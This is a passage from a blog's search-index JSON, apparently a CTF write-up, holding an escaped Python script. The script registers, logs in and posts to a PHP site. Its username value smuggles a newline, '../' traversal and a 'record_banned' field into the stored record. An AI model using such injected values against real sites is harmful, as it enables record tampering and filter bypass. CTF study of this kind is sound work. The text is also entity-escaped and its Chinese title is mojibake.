{\u0026#34;username\u0026#34;: \u0026#34;???\\n,../../../,record_banned,1,\u0026#34;,\u0026#34;password\u0026#34;: \u0026#34;111111111111\u0026#34;,} def register(sess: Session): resp = sess.post(basic + \u0026#34;/register.php\u0026#34;, data=data) def login(sess: Session): resp = sess.post(basic + \u0026#34;/login.php\u0026#34;, data=data) def post(sess: Session): data1 = { \u0026#34;title\u0026#34;: \u0026#34;æ•æ„Ÿè¯\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;tset\u0026#34;, } resp = sess.post(basic + \u0026#34;/post.php\u0026#34;, data=data1) if __name__ == \u0026#34;__main__\u0026#34;: sess = Session() register(sess) login(sess) post(sess) ","date":"0001-01-01T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/","title":""}]